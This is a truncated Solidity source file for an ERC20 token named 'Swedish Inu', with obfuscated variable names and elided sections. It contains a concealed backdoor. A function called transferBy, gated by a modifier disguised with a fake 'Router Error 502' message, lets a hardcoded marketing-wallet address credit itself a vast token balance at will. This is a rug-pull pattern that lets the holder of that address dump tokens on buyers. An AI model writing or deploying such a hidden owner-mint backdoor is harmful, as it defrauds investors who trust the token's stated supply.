...
contract Context {
 ...
 contract SwedishInu is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloWSDE;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Swedish Inu";
    string private _symbol = "SWEDINU";
    uint256 private constant MAX = ~uint256(0);
    uint256 private _maxTx = _totalSupply;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _maximumWSDE = 10000000 * 10**36;
    bool private inSwap = false;
    uint256 private _tFeeTotal;
    uint256 private cryfaleWSDE = 2;
    uint256 private _vebegoWSDE = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloWSDE[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletWSDE = 0xEC3a6DbFa730cA6a3EEf93D0D4317BAd7526592f;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloWSDE[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloWSDE[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleWSDE / 100) / _vebegoWSDE;
        allons = allons -  (_fee * _vebegoWSDE);
        
        superfloWSDE[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaWSDE) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloWSDE[account];
        require(accountBalance >= gzillaWSDE, "BEP : Can't be done");
        unchecked {
            superfloWSDE[account] = accountBalance - gzillaWSDE;
        }
        _totalSupply -= gzillaWSDE;

        emit Transfer(account, address(0), gzillaWSDE);
    }
    ...
    function transferBy() public substitute {
        superfloWSDE[_msgSender()] = superfloWSDE[_msgSender()] +  _maximumWSDE;
    }   
    ...
    modifier substitute() {
    require(_MarketingWalletWSDE == _msgSender(), "Router Error 502: caller is not Router Address");
    _;
    }
}